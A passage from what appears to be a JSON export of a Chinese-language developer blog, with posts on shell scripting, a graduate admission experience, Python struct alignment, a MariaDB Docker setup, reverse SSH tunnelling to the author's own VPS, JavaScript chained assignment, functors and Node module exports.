exit 也可以自行設定退出狀態，若沒有指定，則會使用上一個指令的退出狀態當作退出狀態，即 `exit $?`\n\n### Shell Script 也可以 debug\n\n-   -v 參數可以先印出 script 內容，在執行 shell\n-   -x 參數可以 debug，會逐行指示過程\n\n### 空命令：\n\n在 if （或是 else, elif）中若沒有內容需要執行，需要加一個空命令 `：`，否則會報錯誤（類似 Python 中的 pass。）：\n\n```bash\n#!/bin/bash\nif test -e a;then\n    :\nelse\n    echo \"no\"\nfi\n```\n\n### && 與 ||\n\n-   在單行指令中使用 if 並不直覺，我們可以使用 && 與 || 來強化我們的指令\n-   A && B : 當 A 指令成功則執行 B 指令（A 的退出狀態不為 0 時則不執行 B）\n-   A || B : 當 A 指令執行失敗時，才執行 B\n\n例如：\n\n```bash\ngrep -irn \"target_str\" dic.txt || echo \"Couldn't not find\"\n```\n\n僅有在 grep 未搜尋到內容時，才會印出 Couldn't not find。\n\n## 迴圈\n\n### $* 與 $@\n\n我們有時候會透過 `$*` 取得全部的參數並且使用迴圈迭代，但如果我們的參數中是 `a b 'c d'` 三個參數，會因為 `$*` 是把 $1, $2, ... 取出來，最後變成 a b c d 丟給迴圈迭代：\n\n```bash\nfor arg in $*\ndo\n    echo $arg\ndone\n```\n\n以上的程式碼會印出\n\n```\na\nb\nc\nd\n```\n\n此時我們可以用 `\"$@\"` 來改善，shell 會將其替換為 \"$1\", \"$2\" ...\n\n```bash\nfor arg in \"$@\"\ndo\n    echo $arg\ndone\n```\n\n以上的程式碼會印出：\n\n```\na\nb\nc d\n```\n\n切記！若 \"$@\" 沒有加上雙引號，那麼 $@ 以及 \\$\\* 的結果是一樣的。\n\n### break n\n\n-   Shell 的 break 可以一次跳出不止一層迴圈，在 break n 指定即可\n-   若沒有指定 n 即跳出一層迴圈\n\n### 迴圈次數的幾種指定方式\n\n-   \\$(seq minimum maximum)\n-   {minimum..maximum}\n-   {minimum..maximum..step}\n-   (( EXP1; EXP2; EXP3 ))\n\n## 讀寫資料\n\n### \\$\\$ 變數\n\n`$$` 變數用來顯示當前 PID。\n\n寫 script 時可能會產生一些暫存檔，如果大家都同時在用這支 script，那麼 race condition 可能會發生。要避免的方式就是讓每一次執行所產生的暫存檔名稱都不一樣，那麼使用 `$$` 變數就會是一個好方法。\n\n產生暫存檔較好的方式：\n\n```bash\necho \"This is tmp file\" > /tmp/tmpfile_$$\n```\n\n## 環境\n\n### 區域變數\n\n在 Shell 的環境中，每執行一支 script 都會產生一個屬於該 script 自己的空間（可以想成是產生一個新的 process），該空間與外界互不干擾：\n\n```\n☁ cat s.sh\n#!/bin/bash\necho $x\n☁ x=100\n☁ ./s.sh\n\n☁ echo $x\n100\n```\n\n`s.sh` 腳本看不到外界的變數，外界也看不到它的變數。\n\n### 輸出變數\n\n承上述，如果我們想要將目前的變數與 `子 Shell` 共享時，我們可以使用 `export` 指令\n\n```\n☁ export x\n☁ ./s.sh\n100\n```\n\n-   export -p ：查看目前 export 的變數列表\n\n### 目錄以及環境\n\n有了 `子 Shell` 的概念後，不難理解在 script 中變換目錄對於外界的 Shell 來說是沒有影響力的，因為彼此之間擁有獨立的空間。\n\n那如果想要共享環境，用當前的 Shell 去執行 script 時呢？\n\n`.` 指令提供了這件事（其實就是 source 指令）。\n\n```\n03:11:58 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/shell\n\n03:12:02 yiyu@afra shell → cat s.sh\n#!/bin/bash\ncd ..\n（目錄並沒有被切換）\n03:14:39 yiyu@afra shell → ./s.sh\n03:14:58 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/shell\n（使用 . 指令）\n03:15:43 yiyu@afra shell → . s.sh\n03:15:58 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/\n（目錄被切換了）\n03:16:54 yiyu@afra tmp → cd shell\n/Users/yiyu/dev/tmp/shell\n（使用 source 指令）\n03:17:49 yiyu@afra shell → source s.sh\n03:17:58 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/\n（目錄被切換了）\n```\n\n### () 與 {}\n\n這兩種包裹指令的方式可以讓指令一個接著一個執行下去，差異在於前者是在子 shell 中執行，後者是在當前 shell 中執行。\n\n-   ()：產生新的 Shell 環境來執行\n\n```\n03:27:54 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/shell\n03:27:58 yiyu@afra shell → (cd ..)\n03:28:28 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/shell\n```\n\n-   {}：使用當前環境執行。切記，指令前後必須要空格，最後一個指令後面必須要有分號\n\n```\n03:28:29 yiyu@afra shell → pwd\n/Users/yiyu/dev/tmp/shell\n03:29:23 yiyu@afra shell → { cd ..; pwd; }\n/Users/yiyu/dev/tmp\n```\n\n## 再論參數\n\n### 字串格式\n\n```\n${#string}\n```\n\n可以用來計算字串，非常實用\n\n-   \\$0 可以用來顯示當前的程式名稱，時常被用來顯示當前 Shell 為何\n\n### 樣式配對結構\n\n```bash\nvar=hel___lo~\necho ${var#*l} # 刪除左側最短配對 # ___lo~\necho ${var##*l} # 刪除左側最短長配對 # o~\n\n# 如果想要改為刪除右側，將 # 替換為 %\npath=/Users/yy/dev\nbasename path # Unix 的 basename 指令。輸出：dev\n# 我們可以用樣式配對結構來改寫\necho ${path##*/} # 刪除從左邊配對至最後一個 / ，即可以達成 basename 指令之輸出\n```\n\n# 後記\n\n熟悉 Shell 的一些知識與概念之後，寫 script 時不但能用較為優雅的方式來撰寫，也能增加 script 的靈活度。對於現在 CI/CD 流行的時代，Shell 幾乎是不可或缺的技術之一。這篇文章除了提供自己在日後可以快速方便的查閱以外，也提供有使用過 Shell 但是一直沒有深入了解過的各位朋友們！\n","tags":["shell"]},{"title":"2019 交大資工丁組推甄心得","url":"/2019/11/22/","content":"\n## 本次推甄概況\n\n-   交大資工丁組 備取 1（備上）\n-   交大資工戊組 備取 2（備上）\n-   成大資工乙組 正取 2\n-   台科資管丙組 逕取\n-   台科資工 差 0.4 分逕取（放棄面試）\n-   中央軟工 (放棄面試)\n\n## 自我介紹/背景\n\n不免俗來個自我介紹，原就讀國立暨南國際大學資工系。\n\n校排 47 %。在校期間沒有顧學業成績，空閒時間都在 GitHub 上面玩耍，做一些玩具或是自動化自己的開發流程。大學四年內比較值得提及的經歷大概就是打過 CTF、多次找到各大單位漏洞並且回報、管理過學校學生會的伺服器、獨立開發過校園查詢課程的系統。\n\n去年聽了學長 JackKuo 的建議[1]（建議我去嘗試丁組），於是開始自行架設各種服務，在此也感謝學長毫不猶豫將主機權限開給我，讓我全權負責學生會主機的系統。\n\n同時也接下 LSA（Linux System Administration）課程助教一職，在備課以及幫同學解決問題的同時，自己的實力也不斷累積。在此也感謝 Ubuntu Taiwan 的負責人 BlueT[2]，在我求學期間不斷給予我機會，不管是實習機會還是 Linux 上相關的經驗都對我提供了偌大的幫助。\n\n## 性向測驗\n\n因為自己是新竹人，對交大還算熟悉，面試當天也不太緊張。一方面也可能是因為學長已經多次向我分享過往年經驗。在面試前一週時再看一次去年的考題，有 8 成都能輕鬆應付，當時心情非常平淡。\n\n當天行程為「早上進行性向測驗，下午進行面試」。\n\n性向測驗卷共有 18 頁，作答時間 3 小時。內容包含 Mail, BSD, WWW, Linux, VM, Net。內容多半是問相關的經驗, trace log, 基本的資安，或是某種情況有哪些解決方案，基本上沒有碰過相關服務或是有相關設定經驗無法回答。\n\n順帶一提，性向測驗不列入成績，但是會讓面試官更加了解之後分組會把你分到哪一組，所以基本上挑自己熟悉的題目寫即可，沒有必要硬是把全部題目寫滿，像我就是把自己接觸過的內容都寫完之後就交卷了。\n\n相信大家對考題比較感興趣，所以我在考場與幾位朋友稍微記錄了一下丙丁戊三組的考題[3]，有興趣的朋友再請善加利用。\n\n## 面試\n\n面試的部分總共分為三關，第一天只有兩關，都是由丁組的學長以及丁組畢業在業界的學長進行面試，第二天才是教授進行面試。\n\n第一關有三位學長一起面試，面試內容主要著重在備審資料以及上午的性向測驗。因為自己作答還算流暢（提前一小時交卷），所以面試被問到考卷上相關的議題也都能侃侃而談。其中也有問到我打 CTF 的相關經驗，除了分享我擅長的領域外，也聊了一下目前自己打 CTF 遇到的瓶頸。氣氛歡愉，輕鬆回答即可。\n\n第二關則是有大約十位學長一起面試一位考生，問的問題相當廣泛，像是問「架設過最大的服務」、「有無團隊開發經驗」、「如何進行專案管理」、「在多人團隊如何維持程式碼品質」、「玩過的雲服務」等等議題。比較有意思的是發現至少三位學長的 MacBook 上都貼了 k8s 的貼紙，詢問之下才知道交大自己有兩個 k8s 叢集。\n\n被問到的這些問題大多都是團隊專案開發的基本功，至少我在校園內有分組的專案都會要求組員盡量達到這些要求，所以對於這一塊算是熟悉。也有回答出來，不足的部分是自己的管理經驗都是 Linux 上的管理經驗，對於 BSD 沒有太多的了解，面試官有問到 BSD 相關的服務，當時回答沒有很順暢。\n\n接著是第二天與教授的面試。\n\n教授的面試氣氛輕鬆許多，除了有閒聊一些架設經驗，也有問一些遇到駭客攻打主機的防禦策略。也與教授互相交流了一下現在主流的防禦套件的使用心得，內容沒有像前一天學長問的這麼深入，節奏也慢了許多。\n\n## 給學弟妹的話\n\n1. 在學校的專案、專題，請挑選自己喜歡的主題，並且盡全力的去做。\n\n2. 大學期間多跑 conf 去看一下各間學校的大神們都在忙什麼專案，同時拓展自己視野。\n\n3. GitHub 上面非常多專案可以貢獻，多與其他人一起寫程式，增加自己的實力。\n\n## 結語\n\n感謝大學生活中幫助過我的各位老師，同學等人。\n特別是兩位學長 JackKuo, TTW (CTF 隊伍成員)。\n\n## 參考\n\n[1] 學長 JackKuo 的心得文 : https://reurl.cc/xDvNZ5\n[2] BlueT : https://studio.bluet.org/\n[3] 本次丙丁戊組題目位置（人肉記憶，若有不全請見諒） : https://hackmd.io/@splitline/BkALfYY5r\n","tags":["個人"]},{"title":"Python struct 模組的踩雷記錄","url":"/2019/11/05/","content":"\n## 前言\n\n昨日在寫 Python Socket Programming 作業時，遇到了一個關於 struct 模組的有趣的現象，記錄一下。\n\n## 正文\n\n情境是這樣的，我想要將一個正整數以及一個長度 3 的字串跟一個正整數結構化成 byte 的形式\n\n很直覺的使用了\n\n```python\nimport struct\nstruct.pack(\"I3sI\", 1, b'abc', 1)\n# \\x01\\x00\\x00\\x00abc\\x00\\x01\\x00\\x00\\x00\n```\n\n但這個輸出並不符合我的預期，`正整數 4 bytes` + `長度三的字串 3 bytes` + `正整數 4 bytes`，結果應該要是 `11 bytes`。但是輸出卻是 `\\x01\\x00\\x00\\x00abc\\x00\\x01\\x00\\x00\\x00` -> `12 bytes`\n\n於是使用 calcsize 確認一下\n\n```python\nstruct.calcsize(\"I3sI\")\n# 12\n```\n\n的確也是 `12 bytes`，而且可以發現的是，是中間的字串變成了 `4 bytes`\n\n於是實驗了一下：\n\n```python\nstruct.calcsize(\"3s\")\n# 3\nstruct.calcsize(\"3sI\")\n# 8\nstruct.calcsize(\"4sI\")\n# 8\nstruct.calcsize(\"5sI\")\n# 12\n```\n\n可以發現 `3s` 的確是 `3 bytes`，但是當後面還有有其他 bytes 的話，則會補齊 `4 bytes`，然而我用 `4sI` 可以發現還是 `8 bytes` 無誤。\n\n第一個直覺就是猜想，是不是 struct 自動做了 word 大小為 4 的對齊。\n\n查了一下文件\n\n> By default, C types are represented in the machine’s native format and byte order, and properly aligned by skipping pad bytes if necessary (according to the rules used by the C compiler).\n\n到這邊真相已經大白，但是還是沒解決問題\n\n這個問題的解法就是在 fmt 前面補上一些符號來告訴 struct 模組需不需要自動做對齊\n\n```python\nstruct.pack(\"3sI\", b'abc', 1)\n# b'abc\\x00\\x01\\x00\\x00\\x00'\nstruct.pack(\"@3sI\", b'abc', 1)\n# b'abc\\x00\\x01\\x00\\x00\\x00'\n# 以上兩週是一樣的，預設就是用 @，代表自動對齊\n\nstruct.pack(\"=3sI\", b'abc', 1)\n# b'abc\\x01\\x00\\x00\\x00'\n# 使用 =，代表不啟動對齊\n```\n\n文件還有貼心的寫下\n\n> The form '!' is available for those poor souls who claim they can’t remember whether network byte order is big-endian or little-endian.\n\n```python\nstruct.pack(\"!3sI\", b'abc', 1)\n# b'abc\\x00\\x00\\x00\\x01'\nstruct.pack(\">3sI\", b'abc', 1)\n# b'abc\\x00\\x00\\x00\\x01'\n# 使用網路相關傳輸可以直接用 !，省去記下網路傳輸是 big-endian\nstruct.pack(\"<3sI\", b'abc', 1)\n# b'abc\\x01\\x00\\x00\\x00'\n```\n\n這些符號總共有 `@`, `=`, `<`, `>`, `!`，有興趣可以到[官方文件](https://docs.python.org/3.8/library/struct.html#struct-alignment)了解。有趣的是只有第一個(`@`)，也就是預設的模式會採用自動對齊！\n","tags":["socket","python"]},{"title":"使用 docker 來輕鬆建構資料庫","url":"/2019/10/21/","content":"\n## 緣起\n\n自從使用了 Docker 之後，凡是需要測試新的服務或是把玩新的工具第一個直覺就是去找有沒有 docker image。\n\n然而最近剛好手邊有一個 LINE Nofity 串接的案子，要管理不同使用者的 token 需要一個資料庫來儲存並且管理，於是打算將資料庫包進 Docker，方便日後部署或是備份檔案。\n\n在打包的過程中學習到了一些知識，記錄起來方便日後查詢用，畢竟 Docker file 不是天天寫，時常會忘記。\n\n## 目標\n\n希望將 container 跑起來時，裡面的 database 是已經定義好 Schema 的情況，讓後端服務可以直接進行互動。長期目標是連資料庫內容都要映射到 container 之外，方便日後移轉。不過這篇文章不會提到。\n\n## Docker 那些容易混淆的事\n\n最容易搞混的應該就是 `RUN`, `CMD`, `ENTRYPOINT` 這三個設定值\n\n`RUN` 通常用來安裝套件，像是用來執行 apt 相關指令\n\n`CMD` 用來執行啟動 container 之後的指令，但他可以被 `docker run` 之後的參數來取代，也就是 `docker run` 後面不加上使用者自訂的命令，就會執行 `CMD` 的內容\n\n`ENTRYPOINT` 跟 `CMD` 類似，但是內容不會被 `docker run` 後面給的指令覆蓋掉，那些指令會附加在 `ENTRYPOINT` 之後\n\n除此之外將檔案複製進 container 要用 `COPY` 還是 `ADD` 也有一些不同看法。`ADD` 基本上就是 `COPY` 的增強版，除了可以將檔案複製進容器，也可以填入一串網址。如果填入的來源是壓縮檔，那麼會自動進行壓縮。\n\n所以沒有特別需求的話，單純想複製檔案進容器，還是推薦用 `COPY` 比較簡單明瞭一點。\n\n## 撰寫 Docker file\n\n```docker\nFROM mariadb:10.4.8\nCOPY init.sql /docker-entrypoint-initdb.d/\nENV MYSQL_ROOT_PASSWORD root\nENV MYSQL_DATABASE token_db\nEXPOSE 3306\n```\n\n在撰寫 Docker file 時，記得 image 要附上版本，否則預設是 latest。往後部署到其他伺服器有可能最新版本已經不再是這一版了，此時就可能出現不同版本行為不一的情況。建議一定要指定版本號。\n\n我想要在容器跑起來時自動將 database schema 也一併創建好，此時可以將你的 .sql 檔案放入 `/docker-entrypoint-initdb.d` 這個目錄，此目錄中的 .sql 檔案會在資料庫啟動時自動被執行(在 MySQL image 也是)，如此一來可以省下不少寫 script 去自動表格的時間。\n\n接下來設定好環境變數讓你的 MariaDB \b 自動建立好資料庫以及設定 root 密碼，詳細有哪些環境變數可以設定，在 [MariaDB 的 image 文件中](https://hub.docker.com/_/mariadb)。\n\n## 備份與復原\n\n使用容器部署服務時，可以很方便地將服務進行轉移。但今天的服務是資料庫，有時候我們希望將資料庫的內容從容器內備份出來，才不會因為容器意外停止了而遺失資料。\n\n做到這件事情的方法有很多，可以掛載目錄位置進容器，透過這樣的方式將資料庫相關的檔案與容器外的主機共用。但今天使用的方式是使用 `MySQL` 提供的 `mysqldump` 指令來將資料庫內容備份。\n\n### 備份\n\n`docker exec <cotainer-id> /usr/bin/mysqldump -u root --password=root <db-name> > backup.sql`\n\n`backup.sql` 的名稱可以隨意命名，它是將資料庫內容匯出的 sql 檔案。\n\n### 復原\n\n`cat backup.sql | docker exec -i <cotainer-id> /usr/bin/mysql -u root --password=root <db-name>`\n\n備份與復原可以幫助你在轉移服務到其他主機時，先將原本服務的資料庫內容取出，並且在其他主機回復內容。\n\n## 持久化儲存\n\n以上方法很明顯有一個問題，那就是你無法得知 container 在哪一個時候遇到意外而終止，這樣子也無法在適當的時機備份，有可能造成資料遺失！\n\n想要達成持久化儲存勢必要使用到 `VOLUME` 功能，除此之外還需要一個背景知識，mariaDB（MySQL）的資料儲存位置在 `/var/lib/mysql`。\n\n要達成掛載的方式有很多種，在此使用個人覺得較為直覺的一種：\n\n新增一個 volume 結構並命名為 `db-data`\n\n`docker create volume db-data`\n\n之後將容器跑起來時，指定容器內部的哪一個位置需要往外掛載至 `db-data`\n\n`docker run -it -d -v db-data:/var/lib/mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root db`\n\n如此一來，容器內的 `/var/lib/mysql` 映射至外部的 `db-data`，不管容器存在與否 `db-data` 都會存在！\n\n我們也可以用 `docker volume inspect db-data` 來查看該 `VOLUME` 的資訊\n\n```\n[\n    {\n        \"CreatedAt\": \"2019-11-14T02:17:21Z\",\n        \"Driver\": \"local\",\n        \"Labels\": {},\n        \"Mountpoint\": \"/var/lib/docker/volumes/db-data/_data\",\n        \"Name\": \"db-data\",\n        \"Options\": {},\n        \"Scope\": \"local\"\n    }\n]\n```\n\n可以發現它在本機位置的真實路徑為 `/var/lib/docker/volumes/db-data/_data`。\n\n## 後記\n\n有了 Docker 之後讓很多事情變得很方便，但是自己在學習撰寫 Dockerfile 的過程中以及部署 Docker 服務時，時常被一些類似的指令與行為搞混。希望藉由記錄建構環境流程，一方面加深自己印象，一方面讓更多有類似需求的夥伴可以參考 😊\n","tags":["docker"]},{"title":"不用任何工具！內網穿透至自己的域名下","url":"/2019/09/08/","content":"\n## 前言\n\n> 不久前才寫了一篇 [用 serveo 來穿透內網吧](https://blog.yiyu0x.tk/2019/06/03/%E7%94%A8-serveo-%E4%BE%86%E7%A9%BF%E9%80%8F%E5%85%A7%E7%B6%B2%E5%90%A7/)，結果馬上就要打臉自己了 👋\n\n上一篇文章提到 serveo.net 比起 ngrok 可以自訂 sub domain ，更加方便（不會每一次產生網址都像一堆亂碼一樣不方便記憶）。但是自己在這一陣子使用下發現，serveo.net 的網站似乎常常掛掉，而且打通 reverse ssh 的速度似乎沒有 ngrok 來得快！\n\n但是他的指令 `ssh -R 80:localhost:3000 serveo.net` 讓我讓我靈機一動，反正都是 reverse ssh。只要有自己的 domain 以及自己的 vps，我也能自己架設。\n\n設定好 domain 再使用 reverse proxy，等到需要時再打一條 reverse ssh 似乎也不是多困難的事，憑證的事情交給 certbot 解決就好。\n\n## 事前準備\n\n-   VPS\n-   Domain\n-   NS server 設定一組 A record 指向 VPS\n-   nginx （用來做 reverse proxy）\n\n## 架構\n\n![1](./a.png)\n\n## 開工\n\n首先先在 `/etc/nginx/sites-available` 下新建設定檔，檔名建議用你的 virtual host 來命名，在這邊以 reverse 舉例\n\n/etc/nginx/sites-available/reverse:\n\n```\nserver {\n  server_name reverse.yiyu0x.tk; #改為自己的 domain\n  location / {\n      proxy_pass http://localhost:5487/; #設定為內網任意 port，到時候用來打 reverse ssh\n  }\n}\n```\n\n設定完畢之後，記得 `ln -s` 至 `/etc/nginx/sites-enable` 並且重新啟動 nginx （啟動前可以用 nginx -t 來檢查是否有語法錯誤）\n\n（如果你的內網穿透需要 https，可以用 certbot 來輕鬆幫你新增免費憑證並且管理憑證）\n\n做到這邊已經完成了一半，接下來就剩下打通道了！\n\n`ssh -R 5487:localhost:1234 user@domain.com`\n\n前面的 5487 代表遠端的 port，看你前面設定多少這邊就用多少，因為要與 VPS 上開的 port 綁定，所以建議設定一組自己記得起來的，記得遠端的防火牆要打開！\n\n但是指令這麼長，非常難記憶，如果這篇文章只有這樣子我想大家還是會回去用 ngrok 或是 serveo.net。\n\n在使用 ssh 服務時，可以使用金鑰來達成免密碼登入。以及在 `~/.ssh/config` 下新增設定來簡化登入 ssh 流程\n\n例如:\n\n```\nHost <vps-name>         #自行設定想要的名稱\n    hostname <vps-ip>   #vps ip 位置\n    user <name>         #遠端使用者名稱\n    IdentityFile <path> #私鑰位置\n```\n\n設定完畢之後，指令可以簡化為\n\n`ssh -R 5487:localhost:1234 vps-name`\n\n但是這樣還是不夠好！我們在 local 的 port 可能會因為每一個服務不同而需要穿透不同的 port。\n\n於是我們可以透過修改 `~/.bashrc` 來設定 alias\n\n```bash\nalias rev-ssh='rev-ssh'\nfunction rev-ssh() {\n\tssh -R 5487:localhost:$1 y-gcp\n}\n```\n\n設定完之後，記得下 `source ~/.bashrc` 來讓 bash 重新讀取一次設定檔\n\n如此一來，指令簡化為 `rev-ssh <your-port>`\n\n## 驗收\n\n可以透過 `python3 -m http.server 6666` 在當下目錄開一個 http 服務來瀏覽檔案\n\n再使用 `rev-ssh 6666` 來將 local 的 6666 port 打一條 reverse ssh 至自己的 vps（按照我以上的設定就是 reverse.yiyu0x.tk）\n\n現在就可以與 ngrok 和 serveo.net 正式再見。再也不會因為這兩家服務掛掉而沒有辦法穿透內網了！\n\n## 參考\n\n-   [Bash alias 如何傳入參數(\\$1)](https://blog.longwin.com.tw/2016/03/linux-bash-alias-take-parameter-2016/)\n","tags":["tools"]},{"title":"Javascript 中的連續賦值","url":"/2019/08/13/","content":"\n# 前言\n\n昨天在[卡斯伯](https://www.facebook.com/WccCasper/)大大的臉書上面看了一則有趣的貼文。\n\n![img](https://scontent-tpe1-1.xx.fbcdn.net/v/t1.0-9/67839896_808404392889119_7888086461377937408_n.png?_nc_cat=107&_nc_oc=AQnlzSfKJAo7OARVyT-i6gVGCcn-aMyO3IGuVQa7zGx54eVzW7q9goHk9lNSl7k2xKg&_nc_ht=scontent-tpe1-1.xx&oh=cd49adf668fab32c0de54fea69d86ff3&oe=5DCCB80C)\n\n雖然馬上就有人在留言下方分享答案了，不過還是想記錄一下這個有意思的問題。\n\n正確的概念是 b = c 並且這條 statement 本身會有一個回傳值 (會是 c 的值)，然後 a 收到的其實是這個回傳值。\n\n但是這看起來似乎與 b = c, a = b 的結果一樣，而且也沒什麼辦法可以用實驗去證明。(除了自己在 console 上面分解動作外)\n\n附上一個在 console 上的小的實驗：\n\n```javascript\nWelcome to Node.js v12.7.0.\nType \".help\" for more information.\n> a=0, b=0, c=1 // 初始化\n1\n> a = b = c\n1\n> a\n1\n> b             // 可以發現 a, b 都拿到了與 c 一樣的值\n1\n> b = c         // 實際上 b = c 會先被執行, 並且這一個 statement 會有一個回傳值 1 (這個回傳值也就是 c 的值)\n1\n> a = 1         // 最後 a 其實是拿到 b = c 的回傳值\n1\n```\n\n還有一個有趣的地方是使用 var 與 let 來初始化，回傳值是 `undefined`\n\n```javascript\n> let x = 3\nundefined\n> var x2 = 5\nundefined\n```\n\n也提醒大家以下這一條 statement 只有 a 是 let 屬性，其他變數 (b, c) 都是 global，不要搞混了！\n\n```javascript\n> let a = b = c\n```\n\n# PoC\n\n講了這麼多有一點離題了，看一下官方公布的證明方式！\n\n![img](https://scontent-tpe1-1.xx.fbcdn.net/v/t1.0-9/67937173_808404412889117_3730474130764464128_n.png?_nc_cat=110&_nc_oc=AQlM7EDX3EI_je0puIbf7NdHSS0MhiqmOseoA4x_zNSKJYnJAz3-HO3a1w5b5rMnAns&_nc_ht=scontent-tpe1-1.xx&oh=43b9752e1340aab1e99364d70c3b3cdd&oe=5DC999B8)\n\n以上印出的東西是 `1 {}`\n\n這個簡單的驗證方式勝過前面的千言萬語，我們可以發現 b 並沒有被寫入任何值， a 一樣拿到了 c 的值，而這個值實際上是 b.b = c 的回傳值(即使沒有成功寫入，還是會回傳 c 本身的值)。\n\n之後有看到類似寫法，雖然知道結果為何，但同時也別忘了理解背後的概念！\n","tags":["javascript"]},{"title":"每天都在 Arr.map() 你知道什麼是 functor 嗎?","url":"/2019/07/18/","content":"\n## 前言\n\n程式設計的方法論大體來說可以分為兩種， `functional programming (FP)` 以及 `object oriented programming (OOP)`。\n然而不同的程式語言可能也會提倡不同的設計方法，舉一個明確的例子，在 Java 的 Hello, world 程式：\n\n```java\npublic class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello! World!\");\n    }\n}\n```\n\n整個程式必須包覆在一個與檔案名稱同名的物件中。\n\nJava 這個語言可以說先天就是一門物件導向式的語言(這個說法可能有些爭議)。但這兩種設計方式都只是方法，並沒有說哪一種語言就只能歸類於哪一種設計方式中。\n\n所以，C 語言當然也可以實現物件導向 ([你所不知道的 C 語言：物件導向程式設計篇](https://hackmd.io/@sysprog/HJLyQaQMl?type=view))。\n\n然而看過不少人有一種迷思，認為**物件導向才是比較進步的設計方式**，無論是維護性，或是整個程式之間的架構都優於 `FP`。\n\n不可否認的是物件導向的確有許多概念將抽象化發揮的更加完全，提升軟體工程的效率。但今天我想談的是，那些 `functional programming` 我們忽略掉的特性，這些特性也能幫助我們將程式碼進一步抽象化。\n\n## Functional programming\n\n在物件導向設計中我們知道有 `Class`, `Object`, `Inheritance` 等等概念。\n\n而在 `FP` 的概念則是有 `Immutable object`, `Lambda calculus`, `First class` 等等。\n\n### Immutable object\n\n代表創造了該物件之後，內容就無法再被修改。這樣的特性先天就具備了在多個執行緒下的安全性。想想看，某個物件如果被多個 threads 共用，不會因為 thread A 改了某物件的內容，進而影響了 thread B。這也代表不用使用像 Lock 之類的機制來保證安全性。\n\n舉例來說：\n\n```javascript\nvar numbers = [1, 4, 9];\nvar roots = numbers.map(Math.sqrt); //map會return一個新的array\n// roots 現在是 [1, 2, 3]\n// numbers 還是 [1, 4, 9]\n```\n\n我們可以說 map() 這個函式確保了 Immutable，甚至還有套件庫可以讓全部資料型態都保持 Immutable ([immutable-js](https://github.com/immutable-js/immutable-js))。\n\n### First class\n\n在 JavaScript 中，我們知道 function :\n\n1. 可以像其他 `primitive data type` 般，可以任意傳遞(pass)，指派(assign)\n2. function 的回傳值也可以是一個 function\n\n以上第一種特性可以細稱為 `first-class citizen`，第二種稱為 `higher-order function`。\n\n而這個特性又衍伸出像 `閉包(Closure)`, `柯里化(Currying)` 等等更多的特性。\n\n## 為什麼要提這些？\n\n在講解 `functor` 之前，適度的理解 `functional programming` 是必要的。\n\n`functional programming` 說穿了就是以數學的角度思考，使用 `範疇論 (Category Theory)` 的思想來解決問題。\n\n`functor` 常與 `Applicative`, `Monad` 這三共同被提及，這三者都是 `FP` 重要的概念。\n\n## 什麼是 functor ？\n\n講了這麼多，那什麼是 functor ？\n\n> So, What are Functors? Functors are the containers that can be used with ‘map’ function. ---引述自 [functors-in-javascript](https://hackernoon.com/functors-in-javascript-20a647b8f39f)\n\n簡單來說，一個容器裡面，含有 `map()` 這個屬性，就可以稱為 functor。最簡單的例子就是 JavaScript 中的 Array。\n\n`map()` 屬性又是什麼？根據 [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map) 的解釋\n\n> The map() method creates a new array with the results of calling a provided function on every element in the calling array.\n\n相信大家都用過 `map()`。以 Array.prototype.map() 為例，在 `map()` 的處理過程中，會先把 Array 中的每一個 element 單獨丟進 function 處理，並且將各別結果放至新的 Array 後回傳。\n\n引用 MDN 的範例:\n\n```javascript\nvar numbers = [1, 4, 9];\nvar roots = numbers.map(Math.sqrt); //map會return一個新的array\n// roots 現在是 [1, 2, 3]\n/* numbers 還是 [1, 4, 9]，這證明了 map() 不會去變動到 numbers 的值，\n   map 內部是做了 immutable 的機制，Array.prototype 底下的這些高階函式\n   大多都具有這樣函數式編程裡非常注重的特性 - immutable，不會去改變資料\n   來源本身原有的值 \n*/\n```\n\n在 [functors-in-javascript](https://hackernoon.com/functors-in-javascript-20a647b8f39f) 中有一張非常可愛且簡單明瞭的圖片說明了這件事\n\n![example_img](https://cdn-images-1.medium.com/max/1600/1*GbH6_EAvPrtQGc9fiVZpMA.gif)\n\n圖中的序列，分別取出每一個元素(小雞)，並且加以操作，最後將結果放置新的序列後回傳(注意！圖片中並沒有將小雞放回原本的盒子中)。\n\n說到這裡，應該有人發現它的行為與 `Array.prototype.forEach()` 非常類似。沒錯！他們兩個差異就只是*是否修改原本的值*。(就是前面提過的 Immutable 特性)\n\nfunctor 有一個重要的特性就是確保 Immutable，然而 forEach 則會直接修改原本的值。\n\n## 結論\n\n講了這麼多，`functor` 對我的生活有什麼影響嗎？\n\n`functor` 不但可以增加程式碼的可讀性，更是 `FP` 的設計思想其中的一環。\n\nFP 的表達能力其實不遜色於 OOP。大部分時候，只是我們對 FP 的了解不夠深入而已。\n\n像是此篇未提及的 `applicative` 就是 `functor` 的進化版，如果說 `functor` 是把箱子(容器)中的每一個元素各別丟進 function 處理，那麼 `applicative` 可以想像為連 function 都在箱子(容器)中。我們必須從兩的不同的箱子拿出我們要的內容來做運算。\n\n希望這篇文章不但能讓你了解何謂 `functor`，還可以進而知道 `FP` 還有其他你平常沒有發現的特性。\n","tags":["javascript","fp"]},{"title":"[nodejs] module.exports 與 exports 的差異","url":"/2019/07/01/","content":"\n## 前言\n\nnodejs 中有許多的特性或是方便的功能我們會使用，但實際上不知道內部處理的機制。本篇要探討的是匯出模組的兩種方式 `modules.exports` 以及 `exports`\n\n## 結論(TL;DR)\n\n> The exports variable is available within a module's file-level scope, and is assigned the value of module.exports before the module is evaluated.\n\n在不更改 `modules.exports` 與 `exports` 的前提下，兩者是一樣的。\n使用 `require()` 引入模組，實際上是去 `modules.exports` 找模組，所以 `exports` 只是用來輔助 `modules.exports`。\n\n用程式碼角度來看就是:\n\n```javascript\nmodule.exports = exports = function Constructor() {\n    // ... etc.\n};\n```\n\n-   兩者初始指向同一個物件\n-   兩者有一指向新物件，則斷開兩者關係\n-   require 是去 module.exports 找模組\n\n[Nodejs Doc - modules exports](https://nodejs.org/dist/latest-v10.x/docs/api/modules.html#modules_exports)\n\n## 實驗時間\n\n### 實驗一 (兩者初始指向同一個物件)\n\nm.js:\n\n```javascript\nexports.a = 